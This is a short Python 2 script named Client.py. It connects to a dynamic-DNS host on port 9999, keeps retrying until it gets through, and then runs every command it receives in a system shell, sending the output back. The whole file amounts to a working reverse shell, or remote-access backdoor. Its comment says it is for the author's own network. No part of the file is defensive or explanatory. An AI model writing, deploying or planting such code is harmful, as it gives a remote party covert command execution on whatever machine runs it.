#Client.py
import socket
import os
import time
import sys
import subprocess
# Points to external IP on my network, router forwards 9999 data to my server.
host = "projectice100.ddns.net"
port = 9999

def command_client(command):
    output = ''
    command = command.rstrip()
        #command = command + "; exit 0"
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    for line in iter(output.stdout.readline, ''):
        #line = line.replace('\n', '').replace('\r', '')
        #print line
        s.send(line)
        sys.stdout.flush()

while 1:
    s = socket.socket()          # Create a socket object

    while 1:
        try:
            s.connect((host, port))      # Connect to server
            print "Connected to", host, "on", port
            break

        except:
            pass

    while True:
        try:
            cmd = s.recv(1024)          # receive data from server
            print cmd
            if (cmd  == "quit" or cmd == "exit" or cmd == "close"):
                s.close()
                print "Connection closed by server."

            else:
                command_client(cmd)
                #os.system(cmd)

        except:
            print "Connection closed by client."
            os._exit(1)

# Add a function to get the IP
#http://checkip.dyndns.com/
